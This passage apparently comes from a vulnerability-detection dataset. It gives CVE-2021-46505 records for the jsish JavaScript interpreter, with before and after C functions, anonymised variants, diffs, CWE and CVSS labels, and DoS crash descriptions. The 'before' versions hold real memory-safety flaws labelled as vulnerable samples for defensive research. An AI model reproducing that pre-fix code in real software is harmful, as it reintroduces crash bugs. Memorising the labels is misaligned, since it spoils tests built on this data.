 Jsi_RC Jsi_FunctionInvoke(Jsi_Interp *interp, Jsi_Value *func, Jsi_Value *args, Jsi_Value **ret, Jsi_Value *_this)
 {
     // Arrange for error reporting to point to called function.
+    if (!Jsi_ValueIsFunction(interp, func))
+        return Jsi_LogError(""expected function"");
     Jsi_Func *fstatic = func->d.obj->d.fobj->func;
     jsi_OpCode *oldops = interp->curIp;
     if (fstatic->opcodes)","{'deleted_lines': [], 'added_lines': ['    if (!Jsi_ValueIsFunction(interp, func))', '        return Jsi_LogError(""expected function"");']}",True,Jsish v3.5.0 was discovered to contain a SEGV vulnerability via Jsi_FunctionInvoke at src/jsiFunc.c. This vulnerability can lead to a Denial of Service (DoS).,5.5,MEDIUM,1,valid,2021-12-27T01:36:48Z,4
CVE-2021-46505,['CWE-674'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,pcmacdon/jsish,"Fixes #53

FossilOrigin-Name: 82b73736b7e8564290aefb236f94c390a5284066f41d8c05d3646f6c0f1b99c4",619df528295ef564592a898d58b560c3f3176e21,https://github.com/pcmacdon/jsish/commit/619df528295ef564592a898d58b560c3f3176e21,src/jsiLexer.c,jsi_InitLexer,"Jsi_RC jsi_InitLexer(Jsi_Interp *interp, int release)
{
static struct st_kw {
const char *name;
uintptr_t value;
} keywords[] = {
{ ""if"", IF },
{ ""else"", ELSE },
{ ""for"", FOR },
{ ""in"", IN },
{ ""while"", WHILE },
{ ""do"", DO },
{ ""continue"", CONTINUE },
{ ""switch"", SWITCH },
{ ""case"", CASE },
{ ""default"", DEFAULT },
{ ""break"", BREAK },
{ ""function"", FUNC },
{ ""return"", RETURN },
{ ""var"", LOCAL },
{ ""let"", LOCALLET },
{ ""const"", LOCALCONST },
{ ""of"", OF },
{ ""new"", NEW },
{ ""delete"", DELETE },
{ ""try"", TRY },
{ ""catch"", CATCH },
{ ""throw"", THROW },
{ ""finally"", FINALLY },
{ ""with"", WITH },
{ ""undefined"", UNDEF },
{ ""true"", _TRUE },
{ ""false"", _FALSE },
{ ""this"", _THIS },
{ ""arguments"", ARGUMENTS },
{ ""void"", VOID },
{ ""typeof"", TYPEOF },
{ ""instanceof"", INSTANCEOF },
{ ""string"", TYPESTRING },
{ ""number"", TYPENUMBER },
{ ""regexp"", TYPEREGEXP },
{ ""any"", TYPEANY },
{ ""userobj"", TYPEUSEROBJ },
{ ""iterobj"", TYPEITEROBJ },
{ ""object"", TYPEOBJECT },
{ ""boolean"", TYPEBOOLEAN },
{ ""array"", TYPEARRAY },
{ ""null"", TYPENULL },
{ ""export"", EXPORT },
{ ""set"", OBJSET },
{ ""get"", OBJGET },
{ ""..."", ELLIPSIS },
{ ""debugger"", __DEBUG }
};
uint i;
Jsi_HashEntry *hPtr;
if (release) return JSI_OK;
if (!interp->lexkeyTbl->numEntries) {
bool isNew;
for (i = 0; i < sizeof(keywords) / sizeof(struct st_kw); ++i) {
hPtr = Jsi_HashEntryNew(interp->lexkeyTbl, keywords[i].name, &isNew);
assert(hPtr);
if (hPtr)
Jsi_HashValueSet(hPtr, (void*)keywords[i].value);
}
}
return JSI_OK;
}","Jsi_RC jsi_InitLexer(Jsi_Interp *VAR_0, int VAR_1)
{
static struct st_kw {
const char *name;
uintptr_t value;
} VAR_2[] = {
{ ""if"", VAR_3 },
{ ""else"", VAR_4 },
{ ""for"", VAR_5 },
{ ""in"", VAR_6 },
{ ""while"", VAR_7 },
{ ""do"", VAR_8 },
{ ""continue"", VAR_9 },
{ ""switch"", VAR_10 },
{ ""case"", VAR_11 },
{ ""default"", VAR_12 },
{ ""break"", VAR_13 },
{ ""function"", VAR_14 },
{ ""return"", VAR_15 },
{ ""var"", VAR_16 },
{ ""let"", VAR_17 },
{ ""const"", VAR_18 },
{ ""of"", VAR_19 },
{ ""new"", VAR_20 },
{ ""delete"", VAR_21 },
{ ""try"", VAR_22 },
{ ""catch"", VAR_23 },
{ ""throw"", VAR_24 },
{ ""finally"", VAR_25 },
{ ""with"", VAR_26 },
{ ""undefined"", VAR_27 },
{ ""true"", VAR_28 },
{ ""false"", VAR_29 },
{ ""this"", VAR_30 },
{ ""arguments"", VAR_31 },
{ ""void"", VAR_32 },
{ ""typeof"", VAR_33 },
{ ""instanceof"", VAR_34 },
{ ""string"", VAR_35 },
{ ""number"", VAR_36 },
{ ""regexp"", VAR_37 },
{ ""any"", VAR_38 },
{ ""userobj"", VAR_39 },
{ ""iterobj"", VAR_40 },
{ ""object"", VAR_41 },
{ ""boolean"", VAR_42 },
{ ""array"", VAR_43 },
{ ""null"", VAR_44 },
{ ""export"", VAR_45 },
{ ""set"", VAR_46 },
{ ""get"", VAR_47 },
{ ""..."", VAR_48 },
{ ""debugger"", VAR_49 }
};
uint VAR_50;
Jsi_HashEntry *VAR_51;
if (VAR_1) return VAR_52;
if (!VAR_0->lexkeyTbl->numEntries) {
bool VAR_53;
for (VAR_50 = 0; VAR_50 < sizeof(keywords) / sizeof(struct st_kw); ++VAR_50) {
VAR_51 = Jsi_HashEntryNew(VAR_0->lexkeyTbl, keywords[VAR_50].name, &VAR_53);
assert(VAR_51);
if (VAR_51)
Jsi_HashValueSet(VAR_51, (void*)keywords[VAR_50].value);
}
}
return VAR_52;
}",pcmacdon/jsish/619df528295ef564592a898d58b560c3f3176e21/jsiLexer.c/vul/before/0.json,"Jsi_RC jsi_InitLexer(Jsi_Interp *interp, int release)
{
    static struct st_kw {
        const char *name;
        uintptr_t value;
    } keywords[] = {
        { ""if"", IF },
        { ""else"", ELSE },
        { ""for"", FOR },
        { ""in"", IN },
        { ""while"", WHILE },
        { ""do"", DO },
        { ""continue"", CONTINUE },
        { ""switch"", SWITCH },
        { ""case"", CASE },
        { ""default"", DEFAULT },
        { ""break"", BREAK },
        { ""function"", FUNC },
        { ""return"", RETURN },
        { ""var"", LOCAL },
        { ""let"", LOCALLET },
        { ""const"", LOCALCONST },
        { ""of"", OF },
        { ""new"", NEW },
        { ""delete"", DELETE },
        { ""try"", TRY },
        { ""catch"", CATCH },
        { ""throw"", THROW },
        { ""finally"", FINALLY },
        { ""with"", WITH },
        { ""undefined"", UNDEF },
        { ""true"", _TRUE },
        { ""false"", _FALSE },
        { ""this"", _THIS },
        { ""arguments"", ARGUMENTS },
        { ""void"", VOID },
        { ""typeof"", TYPEOF },
        { ""instanceof"", INSTANCEOF },
        { ""string"", TYPESTRING },
        { ""number"", TYPENUMBER },
        { ""regexp"", TYPEREGEXP },
        { ""any"", TYPEANY },
        { ""userobj"", TYPEUSEROBJ },
        { ""iterobj"", TYPEITEROBJ },
        { ""object"", TYPEOBJECT },
        { ""boolean"", TYPEBOOLEAN },
        { ""array"", TYPEARRAY },
        { ""null"", TYPENULL },
        { ""export"", EXPORT },
        { ""set"", OBJSET },
        { ""get"", OBJGET },
        { ""..."", ELLIPSIS },
        { ""debugger"", __DEBUG },
        { ""Array"", 0 },
        { ""Boolean"", 0 },
        { ""Channel"", 0 },
        { ""Event"", 0 },
        { ""File"", 0 },
        { ""Function"", 0 },
        { ""Info"", 0 },
        { ""Interp"", 0 },
        { ""JSON"", 0 },
        { ""Math"", 0 },
        { ""MySql"", 0 },
        { ""Number"", 0 },
        { ""Object"", 0 },
        { ""RegExp"", 0 },
        { ""Signal"", 0 },
        { ""Socket"", 0 },
        { ""Sqlite"", 0 },
        { ""String"", 0 },
        { ""System"", 0 },
        { ""Util"", 0 },
        { ""Vfs"", 0 },
        { ""WebSocket"", 0 },
        { ""Zvfs"", 0 },
        { ""JSON"", 0 },
        { ""console"", 0 },

    };
    uint i;
    Jsi_HashEntry *hPtr;
    if (release) return JSI_OK;
    if (!interp->lexkeyTbl->numEntries) {
        bool isNew;
        for (i = 0; i < sizeof(keywords) / sizeof(struct st_kw) && keywords[i].name; ++i) {
            hPtr = Jsi_HashEntryNew(interp->lexkeyTbl, keywords[i].name, &isNew);
            assert(hPtr);
            if (hPtr)
                Jsi_HashValueSet(hPtr, (void*)keywords[i].value);
        }
    }
    return JSI_OK;
}","Jsi_RC jsi_InitLexer(Jsi_Interp *VAR_0, int VAR_1)
{
    static struct st_kw {
        const char *name;
        uintptr_t value;
    } VAR_2[] = {
        { ""if"", VAR_3 },
        { ""else"", VAR_4 },
        { ""for"", VAR_5 },
        { ""in"", VAR_6 },
        { ""while"", VAR_7 },
        { ""do"", VAR_8 },
        { ""continue"", VAR_9 },
        { ""switch"", VAR_10 },
        { ""case"", VAR_11 },
        { ""default"", VAR_12 },
        { ""break"", VAR_13 },
        { ""function"", VAR_14 },
        { ""return"", VAR_15 },
        { ""var"", VAR_16 },
        { ""let"", VAR_17 },
        { ""const"", VAR_18 },
        { ""of"", VAR_19 },
        { ""new"", VAR_20 },
        { ""delete"", VAR_21 },
        { ""try"", VAR_22 },
        { ""catch"", VAR_23 },
        { ""throw"", VAR_24 },
        { ""finally"", VAR_25 },
        { ""with"", VAR_26 },
        { ""undefined"", VAR_27 },
        { ""true"", VAR_28 },
        { ""false"", VAR_29 },
        { ""this"", VAR_30 },
        { ""arguments"", VAR_31 },
        { ""void"", VAR_32 },
        { ""typeof"", VAR_33 },
        { ""instanceof"", VAR_34 },
        { ""string"", VAR_35 },
        { ""number"", VAR_36 },
        { ""regexp"", VAR_37 },
        { ""any"", VAR_38 },
        { ""userobj"", VAR_39 },
        { ""iterobj"", VAR_40 },
        { ""object"", VAR_41 },
        { ""boolean"", VAR_42 },
        { ""array"", VAR_43 },
        { ""null"", VAR_44 },
        { ""export"", VAR_45 },
        { ""set"", VAR_46 },
        { ""get"", VAR_47 },
        { ""..."", VAR_48 },
        { ""debugger"", VAR_49 },
        { ""Array"", 0 },
        { ""Boolean"", 0 },
        { ""Channel"", 0 },
        { ""Event"", 0 },
        { ""File"", 0 },
        { ""Function"", 0 },
        { ""Info"", 0 },
        { ""Interp"", 0 },
        { ""JSON"", 0 },
        { ""Math"", 0 },
        { ""MySql"", 0 },
        { ""Number"", 0 },
        { ""Object"", 0 },
        { ""RegExp"", 0 },
        { ""Signal"", 0 },
        { ""Socket"", 0 },
        { ""Sqlite"", 0 },
        { ""String"", 0 },
        { ""System"", 0 },
        { ""Util"", 0 },
        { ""Vfs"", 0 },
        { ""WebSocket"", 0 },
        { ""Zvfs"", 0 },
        { ""JSON"", 0 },
        { ""console"", 0 },

    };
    uint VAR_50;
    Jsi_HashEntry *VAR_51;
    if (VAR_1) return VAR_52;
    if (!VAR_0->lexkeyTbl->numEntries) {
        bool VAR_53;
        for (VAR_50 = 0; VAR_50 < sizeof(keywords) / sizeof(struct st_kw) && keywords[VAR_50].name; ++VAR_50) {
            VAR_51 = Jsi_HashEntryNew(VAR_0->lexkeyTbl, keywords[VAR_50].name, &VAR_53);
            assert(VAR_51);
            if (VAR_51)
                Jsi_HashValueSet(VAR_51, (void*)keywords[VAR_50].value);
        }
    }
    return VAR_52;
}",pcmacdon/jsish/619df528295ef564592a898d58b560c3f3176e21/jsiLexer.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -50,14 +50,40 @@
         { ""set"", OBJSET },
         { ""get"", OBJGET },
         { ""..."", ELLIPSIS },
-        { ""debugger"", __DEBUG }
+        { ""debugger"", __DEBUG },
+        { ""Array"", 0 },
+        { ""Boolean"", 0 },
+        { ""Channel"", 0 },
+        { ""Event"", 0 },
+        { ""File"", 0 },
+        { ""Function"", 0 },
+        { ""Info"", 0 },
+        { ""Interp"", 0 },
+        { ""JSON"", 0 },
+        { ""Math"", 0 },
+        { ""MySql"", 0 },
+        { ""Number"", 0 },
+        { ""Object"", 0 },
+        { ""RegExp"", 0 },
+        { ""Signal"", 0 },
+        { ""Socket"", 0 },
+        { ""Sqlite"", 0 },
+        { ""String"", 0 },
+        { ""System"", 0 },
+        { ""Util"", 0 },
+        { ""Vfs"", 0 },
+        { ""WebSocket"", 0 },
+        { ""Zvfs"", 0 },
+        { ""JSON"", 0 },
+        { ""console"", 0 },
+
     };
     uint i;
     Jsi_HashEntry *hPtr;
     if (release) return JSI_OK;
     if (!interp->lexkeyTbl->numEntries) {
         bool isNew;
-        for (i = 0; i < sizeof(keywords) / sizeof(struct st_kw); ++i) {
+        for (i = 0; i < sizeof(keywords) / sizeof(struct st_kw) && keywords[i].name; ++i) {
             hPtr = Jsi_HashEntryNew(interp->lexkeyTbl, keywords[i].name, &isNew);
             assert(hPtr);
             if (hPtr)","{'deleted_lines': ['        { ""debugger"", __DEBUG }', '        for (i = 0; i < sizeof(keywords) / sizeof(struct st_kw); ++i) {'], 'added_lines': ['        { ""debugger"", __DEBUG },', '        { ""Array"", 0 },', '        { ""Boolean"", 0 },', '        { ""Channel"", 0 },', '        { ""Event"", 0 },', '        { ""File"", 0 },', '        { ""Function"", 0 },', '        { ""Info"", 0 },', '        { ""Interp"", 0 },', '        { ""JSON"", 0 },', '        { ""Math"", 0 },', '        { ""MySql"", 0 },', '        { ""Number"", 0 },', '        { ""Object"", 0 },', '        { ""RegExp"", 0 },', '        { ""Signal"", 0 },', '        { ""Socket"", 0 },', '        { ""Sqlite"", 0 },', '        { ""String"", 0 },', '        { ""System"", 0 },', '        { ""Util"", 0 },', '        { ""Vfs"", 0 },', '        { ""WebSocket"", 0 },', '        { ""Zvfs"", 0 },', '        { ""JSON"", 0 },', '        { ""console"", 0 },', '', '        for (i = 0; i < sizeof(keywords) / sizeof(struct st_kw) && keywords[i].name; ++i) {']}",True,Jsish v3.5.0 was discovered to contain a stack overflow via /usr/lib/x86_64-linux-gnu/libasan.so.4+0x5b1e5.,5.5,MEDIUM,1,valid,2021-12-27T21:08:21Z,4
CVE-2021-46505,['CWE-674'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,pcmacdon/jsish,"Fixes #53

FossilOrigin-Name: 82b73736b7e8564290aefb236f94c390a5284066f41d8c05d3646f6c0f1b99c4",619df528295ef564592a898d58b560c3f3176e21,https://github.com/pcmacdon/jsish/commit/619df528295ef564592a898d58b560c3f3176e21,src/jsiFunc.c,jsi_FuncMake,"Jsi_Func *jsi_FuncMake(jsi_Pstate *pstate, Jsi_ScopeStrs *args, Jsi_OpCodes *ops,
jsi_Pline* line, const char *name, int flags)
{
Jsi_Interp *interp = pstate->interp;
Jsi_ScopeStrs *localvar = jsi_ScopeGetVarlist(pstate);
Jsi_Func *f = jsi_FuncNew(interp);
jsi_Lexer *l = pstate->lexer;
f->isArrow = flags&1;
if (f->isArrow && interp->noES6) {
Jsi_LogError(""es6 feature: arrow function '%s'"", name);
pstate->err_count++;
}
f->isSet = flags&2;
f->isGet = flags&4;
f->type = FC_NORMAL;
f->opcodes = ops;
f->argnames = args;
f->localnames = localvar;
f->bodyline = *line;
f->retType = (Jsi_otype)args->retType;
if (l->ltype == LT_STRING)
f->bodyStr = l->d.str;
f->endPos = l->cur;
f->startPos = -1;     if (f->retType & JSI_TT_UNDEFINED)
Jsi_LogWarn(""invalid use of 'undefined' in a return type: %s"", name?name:"""");
pstate->argType = 0;
if (localvar && args && (!interp->noCheck)) {
int i, j;
for (i=0; i<args->count; i++) {
for (j=0; j<args->count; j++) {
if (i != j && !Jsi_Strcmp(args->args[i].name, args->args[j].name)) {
if (line)
interp->parseLine = line;
Jsi_LogError(""function %s():  duplicate parameter name '%s'"", name?name:"""", args->args[i].name);
if (line)
interp->parseLine = NULL;
pstate->err_count++;
}
}
for (j=0; j<localvar->count; j++) {
if (!Jsi_Strcmp(localvar->args[j].name, args->args[i].name)) {
if (line)
interp->parseLine = line;
Jsi_LogError(""function %s():  parameter name conflicts with local '%s'"", name?name:"""", localvar->args[j].name);
if (line)
interp->parseLine = NULL;
pstate->err_count++;
}
}
}
}
if (name) {
if ((name[0] == 'a' && !Jsi_Strcmp(name,""assert""))
|| (name[0] == 'L' && (!Jsi_Strcmp(name,""LogDebug"") || !Jsi_Strcmp(name,""LogTrace"") || !Jsi_Strcmp(name,""LogTest"")))) {
if (line)
interp->parseLine = line;
Jsi_LogError(""invalid redefine of builtin: %s"", name);
if (line)
interp->parseLine = NULL;
pstate->err_count++;
}
f->name = Jsi_KeyAdd(interp, name);
if (!interp->noCheck) {
if (f->retType && !(f->retType&JSI_TT_VOID) && ops && ops->code_len && ops->codes[ops->code_len-1].op != OP_RET) {
if (line)
interp->parseLine = line;
Jsi_LogWarn(""missing return at end of function '%s'"", name);
if (line)
interp->parseLine = NULL;
}
Jsi_Func *fo = (Jsi_Func*)Jsi_HashGet(interp->staticFuncsTbl, (void*)name, 0);
if (interp->typeCheck.funcdecl && fo && fo->opcodes && fo->opcodes->code_len == 1 && fo->opcodes->codes->op == OP_NOP) {
if (!jsi_FuncSigsMatch(pstate, f, fo)) {
if (line)
interp->parseLine = line;
Jsi_LogWarn(""possible signature mismatch for function '%s' at %.120s:%d"", name, fo->filePtr->fileName, fo->bodyline.first_line);
if (line)
interp->parseLine = NULL;
jsi_TypeMismatch(interp);
}
}
Jsi_HashSet(interp->staticFuncsTbl, name, f);
}
}
return f;
}","Jsi_Func *jsi_FuncMake(jsi_Pstate *VAR_0, Jsi_ScopeStrs *VAR_1, Jsi_OpCodes *VAR_2,
jsi_Pline* VAR_3, const char *VAR_4, int VAR_5)
{
Jsi_Interp *VAR_6 = VAR_0->interp;
Jsi_ScopeStrs *VAR_7 = jsi_ScopeGetVarlist(VAR_0);
Jsi_Func *VAR_8 = jsi_FuncNew(VAR_6);
jsi_Lexer *VAR_9 = VAR_0->lexer;
VAR_8->isArrow = VAR_5&1;
if (VAR_8->isArrow && VAR_6->noES6) {
Jsi_LogError(""es6 feature: arrow function '%s'"", VAR_4);
VAR_0->err_count++;
}
VAR_8->isSet = VAR_5&2;
VAR_8->isGet = VAR_5&4;
VAR_8->type = VAR_10;
VAR_8->opcodes = VAR_2;
VAR_8->argnames = VAR_1;
VAR_8->localnames = VAR_7;
VAR_8->bodyline = *VAR_3;
VAR_8->retType = (Jsi_otype)VAR_1->retType;
if (VAR_9->ltype == VAR_11)
VAR_8->bodyStr = VAR_9->d.str;
VAR_8->endPos = VAR_9->cur;
VAR_8->startPos = -1; 
if (VAR_8->retType & VAR_12)
Jsi_LogWarn(""invalid use of 'undefined' in a return type: %s"", VAR_4?VAR_4:"""");
VAR_0->argType = 0;
if (VAR_7 && VAR_1 && (!VAR_6->noCheck)) {
int VAR_13, VAR_14;
for (VAR_13=0; VAR_13<VAR_1->count; VAR_13++) {
for (VAR_14=0; VAR_14<VAR_1->count; VAR_14++) {
if (VAR_13 != VAR_14 && !Jsi_Strcmp(VAR_1->args[VAR_13].name, VAR_1->args[VAR_14].name)) {
if (VAR_3)
VAR_6->parseLine = VAR_3;
Jsi_LogError(""function %s():  duplicate parameter name '%s'"", VAR_4?VAR_4:"""", VAR_1->args[VAR_13].name);
if (VAR_3)
VAR_6->parseLine = NULL;
VAR_0->err_count++;
}
}
for (VAR_14=0; VAR_14<VAR_7->count; VAR_14++) {
if (!Jsi_Strcmp(VAR_7->args[VAR_14].name, VAR_1->args[VAR_13].name)) {
if (VAR_3)
VAR_6->parseLine = VAR_3;
Jsi_LogError(""function %s():  parameter name conflicts with local '%s'"", VAR_4?VAR_4:"""", VAR_7->args[VAR_14].name);
if (VAR_3)
VAR_6->parseLine = NULL;
VAR_0->err_count++;
}
}
}
}
if (VAR_4) {
if ((VAR_4[0] == 'a' && !Jsi_Strcmp(VAR_4,""assert""))
|| (VAR_4[0] == 'L' && (!Jsi_Strcmp(VAR_4,""LogDebug"") || !Jsi_Strcmp(VAR_4,""LogTrace"") || !Jsi_Strcmp(VAR_4,""LogTest"")))) {
if (VAR_3)
VAR_6->parseLine = VAR_3;
Jsi_LogError(""invalid redefine of builtin: %s"", VAR_4);
if (VAR_3)
VAR_6->parseLine = NULL;
VAR_0->err_count++;
}
VAR_8->name = Jsi_KeyAdd(VAR_6, VAR_4);
if (!VAR_6->noCheck) {
if (VAR_8->retType && !(VAR_8->retType&VAR_15) && VAR_2 && VAR_2->code_len && VAR_2->codes[VAR_2->code_len-1].op != VAR_16) {
if (VAR_3)
VAR_6->parseLine = VAR_3;
Jsi_LogWarn(""missing return at end of function '%s'"", VAR_4);
if (VAR_3)
VAR_6->parseLine = NULL;
}
Jsi_Func *VAR_17 = (Jsi_Func*)Jsi_HashGet(VAR_6->staticFuncsTbl, (void*)VAR_4, 0);
if (VAR_6->typeCheck.funcdecl && VAR_17 && VAR_17->opcodes && VAR_17->opcodes->code_len == 1 && VAR_17->opcodes->codes->op == VAR_18) {
if (!jsi_FuncSigsMatch(VAR_0, VAR_8, VAR_17)) {
if (VAR_3)
VAR_6->parseLine = VAR_3;
Jsi_LogWarn(""possible signature mismatch for function '%s' at %.120s:%d"", VAR_4, VAR_17->filePtr->fileName, VAR_17->bodyline.first_line);
if (VAR_3)
VAR_6->parseLine = NULL;
jsi_TypeMismatch(VAR_6);
}
}
Jsi_HashSet(VAR_6->staticFuncsTbl, VAR_4, VAR_8);
}
}
return VAR_8;
}",pcmacdon/jsish/619df528295ef564592a898d58b560c3f3176e21/jsiFunc.c/vul/before/0.json,"Jsi_Func *jsi_FuncMake(jsi_Pstate *pstate, Jsi_ScopeStrs *args, Jsi_OpCodes *ops,
    jsi_Pline* line, const char *name, int flags)
{
    Jsi_Interp *interp = pstate->interp;
    Jsi_ScopeStrs *localvar = jsi_ScopeGetVarlist(pstate);
    Jsi_Func *f = jsi_FuncNew(interp);
    jsi_Lexer *l = pstate->lexer;
    f->isArrow = flags&1;
    if (f->isArrow && interp->noES6) {
        Jsi_LogError(""es6 feature: arrow function '%s'"", name);
        pstate->err_count++;
    }
    f->isSet = flags&2;
    f->isGet = flags&4;
    f->type = FC_NORMAL;
    f->opcodes = ops;
    f->argnames = args;
    f->localnames = localvar;
    f->bodyline = *line;
    f->retType = (Jsi_otype)args->retType;
    if (l->ltype == LT_STRING)
        f->bodyStr = l->d.str;
    f->endPos = l->cur;
    f->startPos = -1; // Have to get these from newline count.
    if (f->retType & JSI_TT_UNDEFINED)
        Jsi_LogWarn(""invalid use of 'undefined' in a return type: %s"", name?name:"""");
    
    pstate->argType = 0;
    if (localvar && args && (!interp->noCheck)) {
        int i, j;
        for (i=0; i<args->count; i++) {
            char *anam = args->args[i].name;
            if (Jsi_IsReserved(interp, anam, 0)) {
                if (line)
                    interp->parseLine = line;
                Jsi_LogError(""function %s():  reserved parameter name '%s'"", name?name:"""", anam);
                if (line)
                    interp->parseLine = NULL;
                pstate->err_count++;
                break;
            }
            for (j=0; j<args->count; j++) {
                if (i != j && !Jsi_Strcmp(anam, args->args[j].name)) {
                    if (line)
                        interp->parseLine = line;
                    Jsi_LogError(""function %s():  duplicate parameter name '%s'"", name?name:"""", anam);
                    if (line)
                        interp->parseLine = NULL;
                    pstate->err_count++;
                }
            }
            for (j=0; j<localvar->count; j++) {
                if (!Jsi_Strcmp(localvar->args[j].name, args->args[i].name)) {
                    if (line)
                        interp->parseLine = line;
                    Jsi_LogError(""function %s():  parameter name conflicts with local '%s'"", name?name:"""", localvar->args[j].name);
                    if (line)
                        interp->parseLine = NULL;
                    pstate->err_count++;
                }
            }
        }
    }
    if (name) {
        if ((name[0] == 'a' && !Jsi_Strcmp(name,""assert""))
            || (name[0] == 'L' && (!Jsi_Strcmp(name,""LogDebug"") || !Jsi_Strcmp(name,""LogTrace"") || !Jsi_Strcmp(name,""LogTest"")))) {
                if (line)
                    interp->parseLine = line;
                Jsi_LogError(""invalid redefine of builtin: %s"", name);
                if (line)
                    interp->parseLine = NULL;
                pstate->err_count++;
        }
        f->name = Jsi_KeyAdd(interp, name);
        if (!interp->noCheck) {
            
            if (f->retType && !(f->retType&JSI_TT_VOID) && ops && ops->code_len && ops->codes[ops->code_len-1].op != OP_RET) {
                if (line)
                    interp->parseLine = line;
                Jsi_LogWarn(""missing return at end of function '%s'"", name);
                if (line)
                    interp->parseLine = NULL;
                //if (interp->typeCheck.error)
                 //   pstate->err_count++;
            }
             
            Jsi_Func *fo = (Jsi_Func*)Jsi_HashGet(interp->staticFuncsTbl, (void*)name, 0);
            
            // Forward declaration signature compare (indicated by an empty body).
            if (interp->typeCheck.funcdecl && fo && fo->opcodes && fo->opcodes->code_len == 1 && fo->opcodes->codes->op == OP_NOP) {
                if (!jsi_FuncSigsMatch(pstate, f, fo)) {
                    if (line)
                        interp->parseLine = line;
                    Jsi_LogWarn(""possible signature mismatch for function '%s' at %.120s:%d"", name, fo->filePtr->fileName, fo->bodyline.first_line);
                    if (line)
                        interp->parseLine = NULL;
                    jsi_TypeMismatch(interp);
                }
                //printf(""OLD: %s\n"", name);
            }
            Jsi_HashSet(interp->staticFuncsTbl, name, f);
        }
    }
    return f;
}","Jsi_Func *jsi_FuncMake(jsi_Pstate *VAR_0, Jsi_ScopeStrs *VAR_1, Jsi_OpCodes *VAR_2,
    jsi_Pline* VAR_3, const char *VAR_4, int VAR_5)
{
    Jsi_Interp *VAR_6 = VAR_0->interp;
    Jsi_ScopeStrs *VAR_7 = jsi_ScopeGetVarlist(VAR_0);
    Jsi_Func *VAR_8 = jsi_FuncNew(VAR_6);
    jsi_Lexer *VAR_9 = VAR_0->lexer;
    VAR_8->isArrow = VAR_5&1;
    if (VAR_8->isArrow && VAR_6->noES6) {
        Jsi_LogError(""es6 feature: arrow function '%s'"", VAR_4);
        VAR_0->err_count++;
    }
    VAR_8->isSet = VAR_5&2;
    VAR_8->isGet = VAR_5&4;
    VAR_8->type = VAR_10;
    VAR_8->opcodes = VAR_2;
    VAR_8->argnames = VAR_1;
    VAR_8->localnames = VAR_7;
    VAR_8->bodyline = *VAR_3;
    VAR_8->retType = (Jsi_otype)VAR_1->retType;
    if (VAR_9->ltype == VAR_11)
        VAR_8->bodyStr = VAR_9->d.str;
    VAR_8->endPos = VAR_9->cur;
    VAR_8->startPos = -1; /* COMMENT_0 */
    if (VAR_8->retType & VAR_12)
        Jsi_LogWarn(""invalid use of 'undefined' in a return type: %s"", VAR_4?VAR_4:"""");
    
    VAR_0->argType = 0;
    if (VAR_7 && VAR_1 && (!VAR_6->noCheck)) {
        int VAR_13, VAR_14;
        for (VAR_13=0; VAR_13<VAR_1->count; VAR_13++) {
            char *VAR_15 = VAR_1->args[VAR_13].name;
            if (Jsi_IsReserved(VAR_6, VAR_15, 0)) {
                if (VAR_3)
                    VAR_6->parseLine = VAR_3;
                Jsi_LogError(""function %s():  reserved parameter name '%s'"", VAR_4?VAR_4:"""", VAR_15);
                if (VAR_3)
                    VAR_6->parseLine = NULL;
                VAR_0->err_count++;
                break;
            }
            for (VAR_14=0; VAR_14<VAR_1->count; VAR_14++) {
                if (VAR_13 != VAR_14 && !Jsi_Strcmp(VAR_15, VAR_1->args[VAR_14].name)) {
                    if (VAR_3)
                        VAR_6->parseLine = VAR_3;
                    Jsi_LogError(""function %s():  duplicate parameter name '%s'"", VAR_4?VAR_4:"""", VAR_15);
                    if (VAR_3)
                        VAR_6->parseLine = NULL;
                    VAR_0->err_count++;
                }
            }
            for (VAR_14=0; VAR_14<VAR_7->count; VAR_14++) {
                if (!Jsi_Strcmp(VAR_7->args[VAR_14].name, VAR_1->args[VAR_13].name)) {
                    if (VAR_3)
                        VAR_6->parseLine = VAR_3;
                    Jsi_LogError(""function %s():  parameter name conflicts with local '%s'"", VAR_4?VAR_4:"""", VAR_7->args[VAR_14].name);
                    if (VAR_3)
                        VAR_6->parseLine = NULL;
                    VAR_0->err_count++;
                }
            }
        }
    }
    if (VAR_4) {
        if ((VAR_4[0] == 'a' && !Jsi_Strcmp(VAR_4,""assert""))
            || (VAR_4[0] == 'L' && (!Jsi_Strcmp(VAR_4,""LogDebug"") || !Jsi_Strcmp(VAR_4,""LogTrace"") || !Jsi_Strcmp(VAR_4,""LogTest"")))) {
                if (VAR_3)
                    VAR_6->parseLine = VAR_3;
                Jsi_LogError(""invalid redefine of builtin: %s"", VAR_4);
                if (VAR_3)
                    VAR_6->parseLine = NULL;
                VAR_0->err_count++;
        }
        VAR_8->name = Jsi_KeyAdd(VAR_6, VAR_4);
        if (!VAR_6->noCheck) {
            
            if (VAR_8->retType && !(VAR_8->retType&VAR_16) && VAR_2 && VAR_2->code_len && VAR_2->codes[VAR_2->code_len-1].op != VAR_17) {
                if (VAR_3)
                    VAR_6->parseLine = VAR_3;
                Jsi_LogWarn(""missing return at end of function '%s'"", VAR_4);
                if (VAR_3)
                    VAR_6->parseLine = NULL;
                /* COMMENT_1 */
                 /* COMMENT_2 */
            }
             
            Jsi_Func *VAR_18 = (Jsi_Func*)Jsi_HashGet(VAR_6->staticFuncsTbl, (void*)VAR_4, 0);
            
            /* COMMENT_3 */
            if (VAR_6->typeCheck.funcdecl && VAR_18 && VAR_18->opcodes && VAR_18->opcodes->code_len == 1 && VAR_18->opcodes->codes->op == VAR_19) {
                if (!jsi_FuncSigsMatch(VAR_0, VAR_8, VAR_18)) {
                    if (VAR_3)
                        VAR_6->parseLine = VAR_3;
                    Jsi_LogWarn(""possible signature mismatch for function '%s' at %.120s:%d"", VAR_4, VAR_18->filePtr->fileName, VAR_18->bodyline.first_line);
                    if (VAR_3)
                        VAR_6->parseLine = NULL;
                    jsi_TypeMismatch(VAR_6);
                }
                /* COMMENT_4 */
            }
            Jsi_HashSet(VAR_6->staticFuncsTbl, VAR_4, VAR_8);
        }
    }
    return VAR_8;
}",pcmacdon/jsish/619df528295ef564592a898d58b560c3f3176e21/jsiFunc.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -29,24 +29,34 @@
     if (localvar && args && (!interp->noCheck)) {
         int i, j;
         for (i=0; i<args->count; i++) {
+            char *anam = args->args[i].name;
+            if (Jsi_IsReserved(interp, anam, 0)) {
+                if (line)
+                    interp->parseLine = line;
+                Jsi_LogError(""function %s():  reserved parameter name '%s'"", name?name:"""", anam);
+                if (line)
+                    interp->parseLine = NULL;
